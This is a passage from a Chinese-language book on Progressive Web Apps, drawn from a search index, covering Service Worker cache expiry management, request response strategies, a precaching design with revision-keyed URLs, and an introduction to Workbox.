DB({storeName: this.cacheName}) } return this.db } } 有了 getCache() 和 getDB() 之后，就可以在后续的方法实现当中直接调用这两个方法分别获得当前的 cache 和 db 对象了。 写入资源的同时记录资源过期时间 在调用 cache.put() 方法的时候一般用于新增或者更新本地资源，此时应该同步更新缓存的过期时间。由于传入的 maxAgeSeconds 单位是秒，因此在计算过期时间的时间戳时需要乘以 1000 换算成毫秒： class CacheWrapper { // ... async set (request, response) { // 获取 db 对象 let db = this.getDB() // 获取 cache 对象 let cache = await this.getCache() // 同时更新本地缓存与资源所对应的过期时间 await Promise.all([ cache.put(request, response), db.setItem(request.url, Date.now() + this.maxAgeSeconds * 1000) ]) // 清理过期资源，无需阻塞异步方法的执行 this.deleteExpires() } } 读取资源时排除过期资源 在调用 cache.match() 方法查询本地资源的同时，应该确认对应资源是否过期，只有当资源未过期时再将资源返回结果： class CacheWrapper { // ... async get (request) { // 获取 db 对象 let db = this.getDB() // 获取 cache 对象 let cache = await this.getCache() // 同时读取资源及其过期时间 let [response, expireTime] = await Promise.all([ cache.match(request), db.getItem(request.url) ]) // 如果未超时则代表资源没过期，将读取到的资源返回 // 如果资源过期则不返回任何内容 if (expireTime > Date.now()) { return response } // 清理过期资源，无需阻塞异步方法的执行 this.deleteExpires() } } 过期资源清理方法实现 在调用 CacheWrapper 的 set() 和 get() 方法结束前，都调用了 deleteExpires 统一进行过期资源清理，其方法的实现如下所示： class CacheWrapper { // .. async deleteExpires () { // 获取 db 对象 let db = this.getDB() // 获取 cache 对象 let cache = await this.getCache() // 获取全部资源的过期信息 let map = await db.getAll() if (!map) { return } let now = Date.now() // 遍历所有过期信息，并对过期资源进行清理 for (let [url, expireTime] of map) { if (expireTime 利用 CacheWrapper 实现对资源的过期管理 这样我们就可以通过使用 CacheWrapper 实现对资源进行简易的过期管理。比如下面的例子所展示的，结合 Router 实现对图片资源的过期清理。在这个例子中，我们优先从本地缓存中读取图片资源，如果资源尚未被缓存或者资源过期，则发起网络请求获取最新资源并缓存到本地。利用 CacheWrapper 可以非常方便地实现缓存过期管理： const router = new Router() // 实例化 cacheWrapper 对象 const cacheWrapper = new CacheWrapper({ // 单独给图片资源分配缓存名称 cacheName: 'image-cache', expireOptions: { // 对图片资源缓存 1 星期 maxAgeSeconds: 7 * 24 * 60 * 60 } }) router.registerRoute(/\\.(jpe?g|png)$/, async request => { // 优先读取本地缓存中的图片 // 如果本地无缓存图片/缓存过期/读取缓存出错，则 response 为空 let response = await cacheWrapper.get(request).catch(() => {}) if (response) { return response } // 如果本地尚未缓存或者缓存过期，则发起网络请求获取最新图片资源 response = await fetch(request.clone()) // 如果请求成功，则更新缓存 // 更新缓存过程无需阻塞进程 if (response.ok) { cacheWrapper.set(request, response.clone()) } // 返回资源 return response }) 资源管理除了上面所演示的过期管理之外，还可以对某一类资源限制存储的数量，比如限制图片最多缓存 10 张等等，这些管理方案都可以通过 Cache API 与 IndexedDB 相结合的方式实现，在这里就不一一做演示了，读者可以根据 CacheWrapper 的思路进行相关功能的实现。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter05/3-respond-strategy.html":{"url":"chapter05/3-respond-strategy.html","title":"5.3 资源请求响应策略","keywords":"","body":"资源请求响应策略 在 Service Worker 环境下，可以通过 Fetch API 发送网络请求获取资源，也可以通过 Cache API、IndexedDB 等本地缓存中获取缓存资源，甚至可以在 Service Worker 直接生成一个 Response 对象，以上这些都属于资源响应的来源。资源请求响应策略的作用，就是用来解决响应的资源从哪里来的问题。 接下来将介绍一些常用的策略及其简易实现，这些给出的策略代码其主要作用是演示策略的基本实现思路而移除了不少容错兜底的相关逻辑，读者可以在理解思路的基础上对这些代码进行补充完善，并尝试应用到实际的生产环境当中。 由于这些策略都涉及到较为复杂的异步操作，因此在介绍策略的编程实现时将会使用 ES7 的 Async 函数语法来简化代码逻辑。对 Async 函数不太了解的同学可以首先查看第三章 Async 函数的介绍进行简要学习。 准备工作 在介绍响应策略前，首先得统一策略函数的一些基本格式以及声明一些共用方法。 统一策略函数格式 在前面资源请求的拦截代理一节中我们封装了 Router 来统一管理请求响应的分发，对应的响应策略函数以当前请求对象 request 为参数，以响应对象 response，或者异步返回 response 的 Promise 对象最为返回值，这就构成了策略函数的基本格式： /** * 策略函数格式 * * @param {Request} request 当前请求对象 * @return {Response|Promise.} 响应对象 */ function strategy (request) { // ... return response } 由于这些响应策略都或多或少地使用到了 Fetch API、Cache API 的功能，不同的策略在不同的应用场景下所使用的配置可能不一样，为了实现灵活且规范化的配置，我们在这里统一使用高阶函数的形式进行实现： function strategyFactory ({ // Fetch API 配置 fetchOptions, // Cache 名称 cacheName = 'runtime-cache', // cache.match 配置 matchOptions } = {}) { return request => { // 使用 Fetch API 发请求就可以将 fetchOptions 作为参数传入： fetch(request, fetchOptions).then(response => {/* 相关处理 */}) // ... // 使用 cacheName 获取缓存对象 caches.open(cacheName).then(cache => { // 使用 matchOptions 配置查找缓存 cache.match(request, matchOptions) }) // ... return response } } 我们就可以通过这个形式的函数参数传入各项配置，而函数的返回结果就是配置好的策略函数本身： let strategy = strategyFactory({ fetchOptions: { mode: 'cors' }, cacheName: 'v1', matchOptions: { ignoreSearch: true } }) // 配合 Router 进行策略的注册与使用 router.registerRoute('/data.txt', strategy) 公用方法 接下来定义一些常用的方法以便简化接下来的策略实现代码。这些公用方法以局部方法的形式定义在策略工厂函数的函数体内，这样就可以直接使用到工厂函数所传入的参数了。 cacheResponse() 的作用是往缓存中写入资源： const cacheResponse = async (request, response) => { // 使用 cacheName 参数打开缓存 let cache = await caches.open(cacheName) await cache.put(request, response) } getCachedResponse() 的作用是从缓存中查找资源并返回： const getCachedResponse = async request => { let cache = await caches.open(cacheName) return cache.match(request, matchOptions) } fetchAndCatch() 的作用是发起网络请求，并且把成功响应的对象存入缓存中： const fetchAndCatch = async request => { let response = await fetch(request.clone(), fetchOptions) // 请求资源失败时直接返回 if (!response.ok) { return } // 网络请求成功后，将请求响应结果复制一份存入缓存中 // 更新缓存过程无需阻塞函数执行 cacheResponse(request, response.clone()) // 同时缓存更新行为只需静默执行即可 .catch(() => {}) // 返回响应结果 return response } 有了这些公用方法，后面的策略实现过程将变得简单很多。 Network First Network First，网络优先策略。该策略会优先尝试发送网络请求获取资源，在资源获取成功的同时会复制一份资源缓存到本地，当网络请求失败时再尝试从本地缓存中读取缓存资源。Network First 策略一般适用于对请求的实时性和稳定性有要求的情况。其代码实现如下所示： function networkFirst ({ fetchOptions, cacheName = 'runtime-cache', matchOptions } = {}) { // ...（定义getCachedResponse、fetchAndCatch） return async request => { let response try { // 优先发起网络请求，并将请求返回结果缓存到本地 response = await fetchAndCatch(request) } catch (e) {} if (response == null) { // 网络资源请求失败时，从本地缓存中读取缓存 response = await getCachedResponse(request) } return response } } 假设我们需要对 /api 类型的接口请求使用 Network First 的缓存策略，相关代码如下所示： router.registerRoute(/\\/api/, networkFirst()) Cache First Cache First，缓存优先策略。该策略会优先从本地缓存读取资源，读取失败后再发起网络请求，成功获得网络请求响应结果时会将该结果缓存到本地。对于实时性要求不太高的资源，可以使用该策略提高加载速度。缓存优先策略的代码如下所示： function cacheFirst ({ fetchOptions, cacheName = 'runtime-cache', matchOptions } = {}) { // ...（定义 getCachedResponse、fetchAndCatch） return async request => { let response try { // 优先匹配本地缓存 response = await getCachedResponse(request) } catch (e) {} // 匹配不到缓存或者缓存读取出现异常时，再去发起网络请求 // 并且将请求成功的资源写入缓存中 if (response == null) { response = await fetchAndCatch(request) } return response } } 下面演示 Cache First 策略的使用方法。对于 jQuery 这样公共 JS 库就非常适合使用 Cache First 策略，例子中的 jQuery 的代码托管在非同源的 CDN 上面，因此需要传入 fetchOptions 参数去指定该策略中的 fetch 方法请求跨域资源时的请求模式为 cors： router.registerRoute( 'https://code.jquery.com/jquery-3.3.1.min.js', cacheFirst({ fetchOptions: { mode: 'cors' } }) ) Network Only Network Only，仅通过发送正常的网络请求获取资源，并将请求响应结果直接返回。该策略适用于对实时性要求非常高的资源，或者是无需进行缓存的资源。比如验证码图片、统计数据请求等等。策略的代码实现如下所示： function networkOnly ({ fetchOptions } = {}) { return request => fetch(request, fetchOptions) } Cache Only Cache Only，仅从缓存中读取资源。这个策略一般需要配合预缓存方案使用。策略的代码实现如下所示： function cacheOnly ({ cacheName, matchOptions } = {}) { // ...（定义 getCachedResponse） return async request => { let response = await getCachedResponse(request) return response } } Stale While Revalidate Stale While Revalidate，该策略跟 Cache First 策略比较类似，都是优先返回本地缓存的资源。不同的地方在于，Stale While Revalidate 策略无论在缓存读取是否成功的时候都会发送网络请求更新本地缓存。这样的好处是，在保证资源请求响应速度的同时，还能够保证缓存中的资源一直保持一个比较新的状态；它的缺点也比较明显，就是每次请求资源的时候，都会发起网络请求占用用户的网络带宽。其代码实现如下所示： function staleWhileRevalidate ({ fetchOptions, cacheName = 'runtime-cache', matchOptions } = {}) { // ...（定义 getCachedResponse、fetchAndCatch） return async request => { let response // 首先读取本地缓存 try { response = await getCachedResponse(request) } catch (e) {} // 发起网络请求并更新缓存 let fetchPromise = fetchAndCatch(request) // 如果存在本地缓存，则静默更新缓存即可，无需阻塞函数执行 if (response) { // 静默更新，无需报错 fetchPromise.catch(e => {}) } else { // 反之则将网络请求到的资源返回 response = await fetchPromise } return response } } 示例 本节的示例代码托管在 GitHub 上面，读者可以自行将代码下载到本地运行和修改。本示例页面实现了文章阅读功能，页面正文展示文章主体，页脚显示文章阅读量。这是个简单的 SPA 页面，采用了 App Shell 的设计模式，框架与内容分离，内容通过异步数据请求到前端之后再进行前端渲染。 首先我们需要对这个示例的资源进行分析，并选择相应的资源请求响应策略： index.html、index.css、index.js：网页的 App Shell，由于框架与内容分离，可以认为 App Shell 是不常变动的，因此可以选择 Cache First； article.json：文章数据，文章内容可能会被作者编辑产生一定变化，但实时性要求不是很高，在这里可以选择使用 Stale While Revalidate； statistics.json：统计数据，返回文章的阅读量数据，这类数据并不影响文章的展示，因此可以选择 Network Only 或者是 Network First。 接下来我们将上述分析的结论转化为如下 Service Worker 代码： var router = new Router() router.registerRoute(/\\/index\\.(html|css|js)$/, cacheFirst()) router.registerRoute(/\\/article\\.json$/, staleWhileRevalidate()) router.registerRoute(/\\/statistics\\.json$/, networkOnly()) 这样示例的 Service Worker 文件就准备完毕了，然后只需要在 index.html 增加 Service Worker 的注册脚本，这样就开发完成了。 if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/service-worker.js') } 接下来通过 node server.js 命令启动服务器，然后打开 Chrome 浏览器访问 http://127.0.0.1:8080/index.html，可以看到浏览器显示如下所示： 这时打开 Chrome 开发者工具下的 Application > Service Worker 面板，可以看到首次访问页面的时候，service-worker.js 文件开始进行注册并激活。 此时点击展开 Cache Storage 面板，在 runtime-cache 这个缓存空间并没有任何缓存内容。在刷新页面即第二次访问页面之后，runtime-cache 终于有了缓存资源： 此时断开浏览器的网络链接并再一次刷新页面，可以看到在离线情况下，页面上的文章内容和大体样式均正常显示，阅读数的请求由于我们没有对其进行缓存，因此在显示上被容错显示成了 0，这些表现均符合预期。 小结 本节主要介绍了一些常用的资源请求响应策略，依次分析了它们的适用场景，最后结合示例演示了在项目当中的实际应用方法。这些常用策略基本能够满足大部分的 Service Worker 开发需求，但这并不是全部，读者可以根据实际的需求，创造出其他更为复杂的策略。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter05/4-precache.html":{"url":"chapter05/4-precache.html","title":"5.4 预缓存方案","keywords":"","body":"预缓存方案 一个网页的展现所依赖的资源可以大致分为两类：一、静态资源，比如 JS，CSS，前端渲染的 HTML 文件，样式文件中可能使用到的字体、背景图片等等。它们的作用是保证页面的前端功能和样式正常工作。这些资源只有在网站更新上线的时候才会发生变化，因此它们的内容和数量都是确定且可控的，更新频率较低，重复使用率高；二、动态资源，比如各种接口请求返回的各种数据，后端渲染的 HTML 页面，内容中的图片、视频等等。它们更侧重于页面的内容表达，因此会随着展现内容的调整而不断变化。这些资源内容变化频繁且不可控，重复使用率也较低。因此我们应该对这两种资源分别进行管理，同时针对静态资源的特点设计出更为高效的预缓存方案。 预缓存方案设计 首先，静态资源的特点之一是确定性，在网站开发的时候就已经能够确定下来。在前面介绍资源请求响应策略时，资源缓存都是在请求被拦截之后，经过响应策略的处理才被缓存下来，这个缓存过程是被动的，缓存的生效时间也比较慢。但由于静态资源具有确定性，因此可以主动获取所需缓存的资源列表，并且在 Service Worker 安装阶段就主动发起静态资源请求并缓存，这样一旦新的 Service Worker 被激活之后，缓存就直接能投入使用了。这是一个资源预取的过程，因此静态资源的缓存方案也称为预缓存方案。 其次，静态资源具有稳定性，在两次上线期间资源内容不会发生变化。因此可以在拦截到静态资源请求时优先返回缓存资源，从而减少网络请求数，提高了缓存利用率，并最终获得加快页面展现和离线可用的效果。 资源列表获取 框架型资源是可控的，它们在进行网站开发的时候就能够确定下来。比如在上一节的例子当中，很容易就能看出它的框架型资源是 index.html、index.css、index.js；如果是大型前端项目，如果借助了 webpack、Rollup 等前端构建工具，最终的生成产物也都属于框架型资源，通过简单的文件遍历就能够获取资源列表信息。接下来通过路径映射，就可以获得资源的 URL 列表： let urls = [ '/index.html', '/index.js', '/index.css' ] 同时由于能够直接获得资源的内容，也可以在列表中添加资源内容相关的信息，比如文件 md5、文件版本号等信息作为资源的附加标识。通过这些标识可以用来判断资源的内容是否发生变更，为后续资源管理提供更多的信息。因此上面的 URL 列表可以进一步改写成如下形式： let resources = [ // 通过 md5 标识 { url: '/index.html', revision: 'abc' }, // 通过文件版本标识 { url: '/index.js', revision: '1.0.1' }, // url 直接包含标识信息 '/index.abc.css' ] 在获取到需要预缓存的资源列表信息之后，接下来开始设计新资源的加载与缓存。 新资源的加载与缓存 为了能够让静态资源在新的 Service Worker 安装完成时已缓存完毕，可以将资源加载与缓存的过程放在 install 事件回调里执行。 通过前面 Service Worker 生命周期的学习我们知道，Service Worker 安装阶段只会触发一次 install 事件，一旦安装完成便不会重复触发，只有在 Service Worker 文件内容出现变化，或者主动调用 ServiceWorkerRegistration.update() 的情况下才会触发 Service Worker 的重新安装。同时资源的加载与缓存过程可能由于网络原因导致缓存失败，在这种情况下需要中断 Service Worker 的安装过程，等待页面下次被访问的时候重新触发安装过程。因此加载新资源的代码如下所示： self.addEventListener('install', event => { event.waitUntil(cacheAll(cacheName, urls)) }) 其中 cacheAll() 方法可以利用 Cache API 提供的 addAll() 方法简单实现： function cacheAll (cacheName, urls) { return caches.open(cacheName).then(cache => cache.addAll(urls)) } 重名资源的加载 在加载新资源的时候正处于新的 Service Worker 安装阶段，此时旧的 Service Worker 仍在正常工作，因此在加载新资源的时候需要格外注意，不要覆盖掉具有相同路径的旧资源。解决这个问题有以下几种方案： 1.新旧资源使用不同名称的缓存对象进行存储。 这种方案能够非常方便地解决重名问题，新旧资源使用不同名称的缓存对象进行存储，那么各自的资源在存储时就已经相互隔离，因此不需要关心资源是否重名，甚至不需要关心资源是否增减、修改等问题，全部资源都需要进行加载和缓存。这样新旧资源的管理问题就转化成了新旧存储仓库的管理问题，我们只需关心如何增加新仓库，删除旧仓库即可。 但这并不是最优方案，因为新旧资源当中可能存在没有发生变化的部分，这部分资源的重复加载其实是没必要的，既额外消耗了用户流量，也同时减缓了 Service Worker 的安装速度。所以如果要对该方案做进一步优化，可以在加载新资源之前首先通过资源比对的方式，将没有变化的资源直接从旧仓库复制到新仓库当中，剩下的再去请求网络资源。 2.确保资源不重名。 借助 Webpack、Rollup 等构建工具进行前端开发时，可以配置编译产出的静态资源名称带上文件的 md5，这样就能够保证内容发生变更的资源不会产生相同的 URL。但这种方案并不适用于所有的静态资源。举个例子，比如前端渲染的 HTML，尽管它属于静态资源，但是它的 URL 就不允许频繁变更，因此需要采用其他方案作为补充。 在前面资源列表小节内容当中，介绍了一种通过增加 revision 参数来标识文件是否发生变化的方法，我们可以利用这个参数将 URL 改造成不重名的形式。最简单的做法是，将 revision 以 Search 参数的方式拼接到 URL 当中。下面通过代码举例说明： let resource = { url: '/index.js', revision: 'abc' } let cacheKey = location.origin + resource.url + '?precache_url_revision=' + resource.revision // 打印 http://127.0.0.1:8080/index.js?precache_url_revision=abc console.log(cacheKey) 我们可以通过实例化 URL 类对象来简化上述拼接过程： let cacheKeyURL = new URL(resource.url, location) cacheKeyURL.searchParams.set('precache_url_revision', resource.revision) let cacheKey = cacheKeyURL.href 其中所增加的 Search 参数的参数名应该设置成比较特殊的名称以避免原始 URL 存在同名参数导致被覆盖。由于 revision 具有唯一性，就保证了生成的 URL 同样具有唯一性，这样作为资源存储的键值就能够保证不会覆盖掉旧资源。在缓存查询的时候主动给 URL 挂上这个参数再去查询即可。下面通过代码简单演示这个存取过程： let resource = { url: '/index.js', revision: 'abc' } // 存储 // 给资源 URL 拼接 precache_url_revision 参数，并作为键值存储 let cacheKeyURL = new URL(resource.url, location) cacheKeyURL.searchParams.set('precache_url_revision', resource.revision) cache.put(cacheKeyURL.href, response) // 读取 if (requestURL === new URL(resource.url, location).href) { // 给资源请求 URL 拼接 precache_url_revision 参数，并作为键值查询 let cacheKeyURL = new URL(requestURL, location) cacheKeyURL.searchParams.set('precache_url_revision', resource.revision) // 查找缓存资源 cache.match(cacheKeyURL.href).then(response => { if (response != null) { // 资源匹配成功 } }) } 经过补充方案的完善之后，即使 URL 完全一样的资源也能够解决新旧资源覆盖的问题。 预缓存资源加载实现 接下来我们将采用方案 2 来演示预缓存功能的实现，读者也可以根据思路自行实现方案 1 以加深理解。在这里我们可以将预缓存功能封装成一个 Precacher 类，然后可以通过 precache() 方法传入预缓存资源信息。完整的代码可以移步 GitHub 进行学习。以下是相关代码实现： class Precacher { constructor ({ cacheName = 'precache', searchKey = 'precache_url_revision' } = {}) { this.cacheName = cacheName this.searchKey = searchKey // 存储资源信息的列表 this.resources = [] // 初始化事件监听 this.initEventListener() } initEventListener () { // 在 `install` 事件回调执行预缓存资源加载 self.addEventListener('install', event => { event.waitUntil( // 缓存新增/变化的资源 cacheResources(this.cacheName, this.resources) ) }) } precache (resources) { for (let resource of resources) { // 格式化资源信息 let res = formatResource(this.searchKey, resource) this.resources.push(res) } } } 其中 install 事件中所使用的 cacheResources() 方法会首先找出新增或内容发生变化的资源，然后重新请求并缓存。具体实现如下所示： async function cacheResources (cacheName, resources) { let urls = resources.map(resource => resource.cacheKey) // 首先打开并缓存 CacheStorage 对象 let cache = await caches.open(cacheName) // 获取已存储的所有资源键值信息 let requests = await cache.keys() // 获取已存储的资源 URL let cachedURLs = requests.map(request => request.url) // 找出新增资源里面未存储过的资源 URL let updateURLs = urls.filter(url => !cachedURLs.includes(url)) // 最后调用 cache.addAll() 缓存新增资源 await cache.addAll(updateURLs) } 另外在调用 precache() 时，传入的资源信息可能是字符串或者对象，因此需要 formatResource() 方法将资源信息格式化，格式化过程包括 URL 信息补全以及类型统一。经过格式化后的资源信息对象将包含两个属性：url 为补全后的资源原始 URL，cacheKey 为资源存入缓存中的键值。具体实现如下所示： function formatResource (searchKey, resource) { let originURL let cacheKeyURL // 当资源信息为字符串时，说明资源 URL 已经具有唯一性 // 因此可以直接拿 URL 作为资源的存储键值 if (typeof resource === 'string') { originURL = new URL(resource, location) cacheKeyURL = new URL(resource, location) } // 当资源信息为对象时，需要使用 revision 来生成资源存储键值 else { originURL = new URL(resource.url, location) cacheKeyURL = new URL(resource.url, location) cacheKeyURL.searchParams.set(searchKey, resource.revision) } return { url: originURL.href, cacheKey: cacheKeyURL.href } } 这样我们就通过 Precacher 简单实现了预缓存资源的加载。在使用的时候，只需要实例化 Precacher 后调用 precache 方法传入预缓存资源列表信息即可： let precacher = new Precacher() precacher.precache([ { url: '/index.html', revision: 'abc' }, { url: '/index.js', revision: '1.0.1' }, '/index.abc.css' ]) 旧资源的清理 当新的 Service Worker 安装并激活成功之后，旧的预缓存资源就基本没用了，因此需要及时对旧资源进行清理。我们一般选择 activate 事件回调来执行旧资源的清理工作，此时 Service Worker 已经安装完成，并且已经进入激活阶段，激活完成之后新 Service Worker 就已经正式接管并开始工作了，因此在这个阶段清理旧缓存不会对旧 Service Worker 造成影响，并且在 activate 事件的回调当中，清理过程导致的任何出错都不会影响到 Service Worker 的激活。 接下来我们只需往 Precacher 类添加对 activate 事件监听以及旧资源的清理逻辑即可： class Precacher { // ... initEventListener () { // install ... // 添加 activate 事件监听清理旧资源 self.addEventListener('activate', event => { event.waitUntil( // 清理旧缓存 clearOldResources(this.cacheName, this.resources) ) }) } } 其中 clearOldResources() 方法实现了对旧预缓存资源的清理，在实现思路上与前面的 cacheResources() 方法类似，通过比对已缓存资源和当前资源列表信息进行比对，找出旧资源并删除。具体实现如下所示： async function clearOldResources (cacheName, resources) { let urls = resources.map(resource => resource.cacheKey) // 首先打开并缓存 CacheStorage 对象 let cache = await caches.open(cacheName) // 获取已存储的所有资源键值信息 let requests = await cache.keys() // 找出新增的 URL // 获取已存储的资源 URL let cachedURLs = requests.map(request => request.url) // 找出不在资源列表信息当中的 URL let oldURLs = cachedURLs.filter(url => !urls.includes(url)) // 最后调用 cache.delete() 删除旧资源 await Promise.all(oldURLs.map(url => cache.delete(url))) } 预缓存方案的请求响应策略 预缓存资源在加载机制保证了 Service Worker 安装并激活完成时，预缓存资源已全部处于可用状态，因此可以对预缓存资源的请求响应采用 Cache First 甚至 Cache Only 的策略。由于在预缓存资源加载阶段当中，为了避免新旧资源重名而使用修改过的 URL 作为存储键值，因此在拦截到的预缓存请求，也同样需要经过修改才能够查找到缓存的资源。接下来给 Precacher 添加 addRoute() 方法实现对资源的拦截与响应： class Precacher { // ... addRoute () { // addRoute() 方法只需执行一次 if (this.hasAdded) { return } this.hasAdded = true const cacheFirstHandler = cacheFirst({ cacheName: this.cacheName }) const router = new Router() router.registerRoute( request => { return this.resources.some( resource => resource.url === request.url ) }, request => { for (let resource of this.resources) { if (resource.url === request.url) { return cacheFirstHandler(new Request(resource.cacheKey)) } } } ) } // 将 precache() 和 addRoute() 合成一个方法 precacheAndRoute (resources) { this.precache(resources) this.addRoute() } } 这样直接调用 precacheAndRoute() 方法就能够实现资源预缓存的同时也设置好预缓存资源的响应了。 let precacher = new Precacher() precacher.precacheAndRoute([ { url: '/index.html', revision: 'abc' }, { url: '/index.js', revision: '1.0.1' }, '/index.abc.css' ]) 预缓存示例 本节的示例将在上一节的示例基础上增加预缓存功能，相关示例代码托管在 GitHub 上面，读者可以自行将代码下载到本地运行和修改。 首先从示例的资源分析可以看出，网页的 App Shell 部分属于静态资源，因此可以进行预缓存。 然后需要获取静态资源的 md5 值，并且将得到的 md5 值添加到 index.js 和 index.css 的文件名当中，由于 index.html 的 URL 不允许发生变化，因此在生成资源信息列表的时候给 index.html 的资源信息描述添加 revision： let resources = [ { url: '/index.html', revision: '5ed70e0c237b4c66' }, '/index.f8666b443c7a0e84.js', '/index.1236d1250f7ffbdc.css' ] 接下来修改 Service Worker，添加预缓存相关代码，同时移除重复的路由规则即可。利用上面实现的 Precacher 类可以非常方便地实现预缓存规则的添加： // 预缓存 let precacher = new Precacher() precacher.precacheAndRoute(resources) // 动态缓存 var router = new Router() // 删除预缓存已经处理的路由 // router.registerRoute(/\\/index\\.(html|css|js)$/, cacheFirst()) router.registerRoute(/\\/article\\.json$/, staleWhileRevalidate()) router.registerRoute(/\\/statistics\\.json$/, networkOnly()) 这样预缓存的改造工作就完成了。启动好示例服务器，使用 Chrome 浏览器重新访问 http://127.0.0.1:8080/index.html，这时可以通过开发者工具观察到新的 Service Worker 开始安装，同时 Cache Storage 面板多了一个名为“precache”的缓存仓库，里面的内容正是预缓存资源。接下来断开浏览器的网络连接，页面仍然能够正常显示，说明预缓存资源已添加成功并且正常工作。 接下来修改静态资源内容，用于观察预缓存资源的更新过程。首先在 index.html 上修改部分内容，比如增加 标签显示文案 这是一首小诗，这样 index.html 的 md5 将会变成 asdf，因此需要更新 service-worker.js 中的资源信息列表部分： let resources = [ { url: '/index.html', revision: 'c607781a6a09a468' }, // ... ] // ... 接下来重新刷新页面，可以看到此时页面上并没有显示后面添加的文案“这是一行小诗”，说明 index.html 是从缓存中读取的。同时由于 service-worker.js 文件内容变更而触发了 Service Worker 的重新安装： 安装完成时“precache”缓存仓库中便会同时存在两条“/index.html”的存储条目： 之后在控制台点击 skipWaiting 按钮或刷新页面触发 Service Worker 进入激活阶段。当 Service Worker 激活完成时，旧的“/index.html”缓存会被删除，同时页面显示了新添加的文案，说明 Precacher 成功实现了新旧资源交替更换的管理。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter05/5-workbox.html":{"url":"chapter05/5-workbox.html","title":"5.5 使用 Workbox","keywords":"","body":"使用 Workbox Workbox 是 Google Chrome 团队推出的一套 PWA 的解决方案，这套解决方案当中包含了核心库和构建工具，因此我们可以利用 Workbox 实现 Service Worker 的快速开发。本节内容将介绍 Workbox 的一些常用方法。 引入 Workbox Service Worker 文件引入 Workbox 的方法非常简单，只需要在文件顶部增加一行代码即可： importScripts('https://storage.googleapis.com/workbox-cdn/releases/4.2.0/workbox-sw.js') Workbox 从 3.x 版本开始便将其核心文件托管到 CDN 上进行维护，开发者也可以下载下来自行维护。 我们可以通过判断全局对象 workbox 是否存在来确认 Workbox 是否加载完成： if (workbox) { // Workbox 加载完成 } 一旦 Workbox 加载完成，我们便可以使用挂载到 workbox 对象上的各种功能了。 Workbox 配置 Workbox 提供了默认的预缓存和动态缓存的名称，可分别通过 workbox.core.cacheNames.precache 和 workbox.core.cacheNames.runtime 获取当前定义的预缓存和动态缓存名称。在通常情况下，我们使用默认的缓存名称进行资源存取即可，假如遇到缓存名称冲突的情况，也可以调用 workbox.core.setCacheNameDetails 方法去修改这些默认名称。下面的代码演示了修改默认名称的方法以及修改结果： // 修改默认配置 workbox.core.setCacheNameDetails({ prefix: 'app', suffix: 'v1', precache: 'precache', runtime: 'runtime' }) // 打印修改结果 // 将打印 'app-precache-v1' console.log(worbox.core.cacheNames.precache) // 将打印 'app-runtime-v1' console.log(workbox.core.cacheNames.runtime) Workbox 预缓存功能 workbox.precaching 对象提供了常用的预缓存功能，其中最常用的方法是 workbox.precaching.precacheAndRoute。它的作用跟我们前面实现的 Precacher.precacheAndRoute() 的功能类似， 都是将传入的资源列表进行预缓存，同时对匹配到的预缓存请求直接从本地缓存中读取并返回。 workbox.routing.precacheAndRoute([ { url: '/index.html', revision: 'asdf' }, '/index.abc.js', '/index.bcd.css' ]) Workbox 路由功能 Workbox 对资源请求匹配和对应的缓存策略执行进行了统一管理，采用路由注册的组织形式，以此来规范化动态缓存。与前面我们封装的 Router 类似，Workbox 提供了 worbox.routing.registerRoute 方法进行路由注册，使用方法如下所示： workbox.routing.registerRoute(match, handlerCb) 接下来我们将对两个参数进行介绍。 路由匹配规则 workbox.routing.registerRoute 的第一个参数 match 是路由的匹配规则，支持以下几种匹配模式： 1.对资源 URL 进行字符串匹配。URL 字符串可以是完整 URL 或者是相对路径，如果是相对路径，Workbox 首先会以当前网页的 URL 为基准进行补全再进行字符串匹配。假设当前页面的 URL 为 http://127.0.0.1:8080/index.html，那么如下所示所注册的路由都是能够正常匹配到 http://127.0.0.1:8080/index.css 这个资源请求的： workbox.routing.registerRoute('http://127.0.0.1:8080/index.css', handlerCb) workbox.routing.registerRoute('/index.css', handlerCb) workbox.routing.registerRoute('./index.css', handlerCb) 2.对资源 URL 进行正则匹配。假设我们注册这样一条正则匹配的路由规则： workbox.routing.registerRoute(/\\/index\\.css$/, handlerCb) 那么以下以 '/index.css' 为结尾的同域资源都能够命中这条路由规则： http://127.0.0.1:8080/index.css http://127.0.0.1:8080/a/index.css http://127.0.0.1:8080/a/b/index.css 但是对于跨域资源来说并不会命中这条路由规则。这是因为 Workbox 在正则匹配的模式下对跨域资源做了特殊处理，一般情况下会忽略掉对跨域资源的匹配，只有当正则表达式能够匹配到跨域资源 URL 的开头，Workbox 才会明确地知道这类跨域资源需要进行动态缓存处理。因此，如下所示的正则匹配规则才会命中 https://third-party-site.com 这个域下的跨域资源请求： workbox.routing.registerRoute( /^https:\\/\\/third-party-site\\.com\\/.*\\/index\\.css$/, handlerCb ) 3.自定义路由匹配方法。match 允许传入一个自定义方法来实现较为复杂的资源请求匹配规则，这个自定义方法可以仿造下面的代码实现： const match = ({url, event}) => { return url.pathname === '/index.html' } 其中 url 是 URL 类的实例，event 是 fetch 事件的回调参数。url 可通过对 URL 类进行实例化，从 event.request.url 转换得到： let url = new URL(event.request.url) 自定义路由匹配方法有两点要求，首先要求是个同步执行函数，其次函数在表示资源请求匹配成功的时候，只需要返回一个真值（即强制转化为布尔值后为 true 的值）即可。 资源请求处理方法 workbox.routing.registerRoute 的第二个参数 handlerCb 是对匹配到的资源请求进行处理的方法，开发者可以在这里决定如何响应请求，无论是从网络、从本地缓存还是在 Service Worker 中直接生成都是可以的。比如： const handlerCb = ({url, event, params}) => { return Promise.resolve(new Response('Hello World!')) } 其中，传入资源请求处理方法的对象包含以下属性： url：event.request.url 经 URL 类实例化的对象； event：fetch 事件回调参数； params：自定义路由匹配方法所返回的值。 对资源请求处理方法的要求是，函数必须是个异步方法并返回一个 Promise，且这个 Promise 解析的结果必须是一个 Response 对象。 Workbox 缓存策略 workbox.strategies 对象提供了一系列常用的动态缓存策略来实现对资源请求的处理。包括了以下几种策略： NetworkFirst：网络优先 CacheFirst：缓存优先 NetworkOnly：仅使用正常的网络请求 CacheOnly：仅使用缓存中的资源 